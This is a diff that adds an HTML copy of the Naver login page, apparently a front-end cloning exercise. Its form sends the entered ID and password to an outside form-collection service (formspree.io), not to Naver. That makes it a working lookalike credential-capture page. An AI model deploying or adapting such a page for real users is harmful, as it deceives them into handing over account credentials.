@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="./css/style.css">
+  <title>네이버 로그인</title>
+</head>
+<body>
+  <div class="container">
+    <header class="header">
+      <h1 class="header__logo">
+        <a href="https://www.naver.com" target="_blank" rel="noopener noreferrer">
+          <img srcset="./images/logo.svg" src="./images/logo.png" alt="네이버">
+        </a>
+      </h1>
+    </header>
+    <main class="main">
+      <h2 class="a11yHidden">로그인</h2>
+      <form action="https://formspree.io/f/mrgrplje" method="POST" class="loginForm">
+        <fieldset>
+          <legend>로그인 폼</legend>
+          <div class="loginForm__container">
+            <div class="userEmail">
+              <div class="formControl formControlUser">
+                <label for="userEmail" class="a11yHidden formControl__label">아이디</label>
+                <input class="formControl__input" type="email" id="userEmail" name="userEmail" required placeholder="아이디">
+              </div>
+              <span class="errorMessage">아이디는 이메일 형식이어야 합니다.</span>
+            </div>
+            <div class="userPassword is--invalid">
+              <div class="formControl formControlUser">
+                <label for="userPassword" class="a11yHidden formControl__label">비밀번호</label>
+                <input class="formControl__input" type="password" id="userPassword" name="userPassword" required placeholder="비밀번호">
+              </div>
+              <span class="errorMessage">비밀번호를 입력해주세요.</span>
+            </div>
+            <div class="userSelectInfo">
+              <div class="formControl loginState">
+                <input type="checkbox" class="formControl__checkbox loginState__checkbox" name="loginState" id="loginState">
+                <label for="loginState" class="formControl__label loginState__label">
+                  로그인 상태유지
+                </label>
+              </div>
+              <a href="https://www.naver.com" class="ipSecurityLink" target="_blank" rel="noreferrer noopener">
+                IP 보안
+              </a>
+              <div class="formControl ipSecurity">
+                <input type="checkbox" aria-label="IP 보안" class="formControl__checkbox ipSecurity__checkbox" name="ipSecurity" id="ipSecurity">
+                <label for="ipSecurity" class="formControl__label ipSecurity__label"></label>
+              </div>
+            </div>
+            <div class="formControl loginButton">
+              <button type="submit" class="formControl__button">
+                로그인
+              </button>
+            </div>
+          </div>
+        </fieldset>
+      </form>
+    </main>
+    <footer class="footer a11yHidden"></footer>
+  </div>
+</body>
+</html>
